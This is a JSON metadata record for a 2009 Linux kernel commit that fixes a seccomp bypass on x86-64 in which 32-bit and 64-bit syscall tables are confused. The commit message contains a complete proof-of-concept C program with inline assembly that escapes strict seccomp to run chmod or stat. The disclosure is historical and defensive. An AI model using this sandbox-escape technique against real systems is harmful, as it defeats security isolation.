@@ -1,0 +1,150 @@
+{
+  "hash": "5b1017404aea6d2e552e991b3fd814d839e9cd67",
+  "hash_short": "5b101740",
+  "subject": "x86-64: seccomp: fix 32/64 syscall hole",
+  "body": "On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with\nljmp, and then use the \"syscall\" instruction to make a 64-bit system\ncall.  A 64-bit process make a 32-bit system call with int $0x80.\n\nIn both these cases under CONFIG_SECCOMP=y, secure_computing() will use\nthe wrong system call number table.  The fix is simple: test TS_COMPAT\ninstead of TIF_IA32.  Here is an example exploit:\n\n\t/* test case for seccomp circumvention on x86-64\n\n\t   There are two failure modes: compile with -m64 or compile with -m32.\n\n\t   The -m64 case is the worst one, because it does \"chmod 777 .\" (could\n\t   be any chmod call).  The -m32 case demonstrates it was able to do\n\t   stat(), which can glean information but not harm anything directly.\n\n\t   A buggy kernel will let the test do something, print, and exit 1; a\n\t   fixed kernel will make it exit with SIGKILL before it does anything.\n\t*/\n\n\t#define _GNU_SOURCE\n\t#include <assert.h>\n\t#include <inttypes.h>\n\t#include <stdio.h>\n\t#include <linux/prctl.h>\n\t#include <sys/stat.h>\n\t#include <unistd.h>\n\t#include <asm/unistd.h>\n\n\tint\n\tmain (int argc, char **argv)\n\t{\n\t  char buf[100];\n\t  static const char dot[] = \".\";\n\t  long ret;\n\t  unsigned st[24];\n\n\t  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)\n\t    perror (\"prctl(PR_SET_SECCOMP) -- not compiled into kernel?\");\n\n\t#ifdef __x86_64__\n\t  assert ((uintptr_t) dot < (1UL << 32));\n\t  asm (\"int $0x80 # %0 <- %1(%2 %3)\"\n\t       : \"=a\" (ret) : \"0\" (15), \"b\" (dot), \"c\" (0777));\n\t  ret = snprintf (buf, sizeof buf,\n\t\t\t  \"result %ld (check mode on .!)\\n\", ret);\n\t#elif defined __i386__\n\t  asm (\".code32\\n\"\n\t       \"pushl %%cs\\n\"\n\t       \"pushl $2f\\n\"\n\t       \"ljmpl $0x33, $1f\\n\"\n\t       \".code64\\n\"\n\t       \"1: syscall # %0 <- %1(%2 %3)\\n\"\n\t       \"lretl\\n\"\n\t       \".code32\\n\"\n\t       \"2:\"\n\t       : \"=a\" (ret) : \"0\" (4), \"D\" (dot), \"S\" (&st));\n\t  if (ret == 0)\n\t    ret = snprintf (buf, sizeof buf,\n\t\t\t    \"stat . -> st_uid=%u\\n\", st[7]);\n\t  else\n\t    ret = snprintf (buf, sizeof buf, \"result %ld\\n\", ret);\n\t#else\n\t# error \"not this one\"\n\t#endif\n\n\t  write (1, buf, ret);\n\n\t  syscall (__NR_exit, 1);\n\t  return 2;\n\t}\n\nSigned-off-by: Roland McGrath <roland@redhat.com>\n[ I don't know if anybody actually uses seccomp, but it's enabled in\n  at least both Fedora and SuSE kernels, so maybe somebody is. - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
+  "full_message": "x86-64: seccomp: fix 32/64 syscall hole\n\nOn x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with\nljmp, and then use the \"syscall\" instruction to make a 64-bit system\ncall.  A 64-bit process make a 32-bit system call with int $0x80.\n\nIn both these cases under CONFIG_SECCOMP=y, secure_computing() will use\nthe wrong system call number table.  The fix is simple: test TS_COMPAT\ninstead of TIF_IA32.  Here is an example exploit:\n\n\t/* test case for seccomp circumvention on x86-64\n\n\t   There are two failure modes: compile with -m64 or compile with -m32.\n\n\t   The -m64 case is the worst one, because it does \"chmod 777 .\" (could\n\t   be any chmod call).  The -m32 case demonstrates it was able to do\n\t   stat(), which can glean information but not harm anything directly.\n\n\t   A buggy kernel will let the test do something, print, and exit 1; a\n\t   fixed kernel will make it exit with SIGKILL before it does anything.\n\t*/\n\n\t#define _GNU_SOURCE\n\t#include <assert.h>\n\t#include <inttypes.h>\n\t#include <stdio.h>\n\t#include <linux/prctl.h>\n\t#include <sys/stat.h>\n\t#include <unistd.h>\n\t#include <asm/unistd.h>\n\n\tint\n\tmain (int argc, char **argv)\n\t{\n\t  char buf[100];\n\t  static const char dot[] = \".\";\n\t  long ret;\n\t  unsigned st[24];\n\n\t  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)\n\t    perror (\"prctl(PR_SET_SECCOMP) -- not compiled into kernel?\");\n\n\t#ifdef __x86_64__\n\t  assert ((uintptr_t) dot < (1UL << 32));\n\t  asm (\"int $0x80 # %0 <- %1(%2 %3)\"\n\t       : \"=a\" (ret) : \"0\" (15), \"b\" (dot), \"c\" (0777));\n\t  ret = snprintf (buf, sizeof buf,\n\t\t\t  \"result %ld (check mode on .!)\\n\", ret);\n\t#elif defined __i386__\n\t  asm (\".code32\\n\"\n\t       \"pushl %%cs\\n\"\n\t       \"pushl $2f\\n\"\n\t       \"ljmpl $0x33, $1f\\n\"\n\t       \".code64\\n\"\n\t       \"1: syscall # %0 <- %1(%2 %3)\\n\"\n\t       \"lretl\\n\"\n\t       \".code32\\n\"\n\t       \"2:\"\n\t       : \"=a\" (ret) : \"0\" (4), \"D\" (dot), \"S\" (&st));\n\t  if (ret == 0)\n\t    ret = snprintf (buf, sizeof buf,\n\t\t\t    \"stat . -> st_uid=%u\\n\", st[7]);\n\t  else\n\t    ret = snprintf (buf, sizeof buf, \"result %ld\\n\", ret);\n\t#else\n\t# error \"not this one\"\n\t#endif\n\n\t  write (1, buf, ret);\n\n\t  syscall (__NR_exit, 1);\n\t  return 2;\n\t}\n\nSigned-off-by: Roland McGrath <roland@redhat.com>\n[ I don't know if anybody actually uses seccomp, but it's enabled in\n  at least both Fedora and SuSE kernels, so maybe somebody is. - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
+  "author_name": "Roland McGrath",
+  "author_email": "roland@redhat.com",
+  "author_date": "Fri Feb 27 23:25:54 2009 -0800",
+  "author_date_iso": "2009-02-27T23:25:54-08:00",
+  "committer_name": "Linus Torvalds",
+  "committer_email": "torvalds@linux-foundation.org",
+  "committer_date": "Mon Mar 2 15:41:30 2009 -0800",
+  "committer_date_iso": "2009-03-02T15:41:30-08:00",
+  "files_changed": [
+    "arch/mips/include/asm/seccomp.h",
+    "arch/powerpc/include/asm/compat.h",
+    "arch/powerpc/include/asm/seccomp.h",
+    "arch/sparc/include/asm/compat.h",
+    "arch/sparc/include/asm/seccomp.h",
+    "arch/x86/include/asm/seccomp_32.h",
+    "arch/x86/include/asm/seccomp_64.h",
+    "kernel/seccomp.c"
+  ],
+  "files_changed_count": 8,
+  "stats": [
+    {
+      "file": "arch/mips/include/asm/seccomp.h",
+      "insertions": 0,
+      "deletions": 1
+    },
+    {
+      "file": "arch/powerpc/include/asm/compat.h",
+      "insertions": 5,
+      "deletions": 0
+    },
+    {
+      "file": "arch/powerpc/include/asm/seccomp.h",
+      "insertions": 0,
+      "deletions": 4
+    },
+    {
+      "file": "arch/sparc/include/asm/compat.h",
+      "insertions": 5,
+      "deletions": 0
+    },
+    {
+      "file": "arch/sparc/include/asm/seccomp.h",
+      "insertions": 0,
+      "deletions": 6
+    },
+    {
+      "file": "arch/x86/include/asm/seccomp_32.h",
+      "insertions": 0,
+      "deletions": 6
+    },
+    {
+      "file": "arch/x86/include/asm/seccomp_64.h",
+      "insertions": 0,
+      "deletions": 8
+    },
+    {
+      "file": "kernel/seccomp.c",
+      "insertions": 4,
+      "deletions": 3
+    }
+  ],
+  "total_insertions": 14,
+  "total_deletions": 28,
+  "total_changes": 42,
+  "parents": [
+    "ccbe495caa5e604b04d5a31d7459a6f6a76a756c"
+  ],
+  "branches": [
+    "* development",
+    "master",
+    "remotes/origin/HEAD -> origin/master",
+    "remotes/origin/master"
+  ],
+  "tags": [
+    "v2.6.29",
+    "v2.6.29-rc7",
+    "v2.6.29-rc8",
+    "v2.6.30",
+    "v2.6.30-rc1",
+    "v2.6.30-rc2",
+    "v2.6.30-rc3",
+    "v2.6.30-rc4",
+    "v2.6.30-rc5",
+    "v2.6.30-rc6"
+  ],
+  "is_merge": false,
+  "security_info": {
+    "cve_ids": [],
+    "security_keywords": [
+      "exploit"
+    ]
+  },
+  "fix_type": "security",
+  "file_results": [
+    {
+      "file": "arch/mips/include/asm/seccomp.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/sparc/include/asm/compat.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/x86/include/asm/seccomp_64.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/x86/include/asm/seccomp_32.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/powerpc/include/asm/seccomp.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "kernel/seccomp.c",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/powerpc/include/asm/compat.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    },
+    {
+      "file": "arch/sparc/include/asm/seccomp.h",
+      "pre_version": false,
+      "post_version": true,
+      "patch": true
+    }
+  ]
+}
